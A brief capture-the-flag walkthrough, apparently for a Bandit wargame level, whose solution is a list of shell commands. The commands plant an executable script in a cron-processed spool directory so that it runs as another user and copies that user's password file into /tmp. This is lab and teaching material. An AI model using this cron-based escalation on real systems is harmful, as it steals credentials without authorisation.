Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.


Solution

cd /etc/cron.d/
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
ls -l  /usr/bin/cronjob_bandit24.sh
mkdir -p /var/spool/bandit24/foo
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass' > /var/spool/bandit24/foo/my_script.sh
chmod +x /var/spool/bandit24/foo/my_script.sh
cat /tmp/bandit24_pass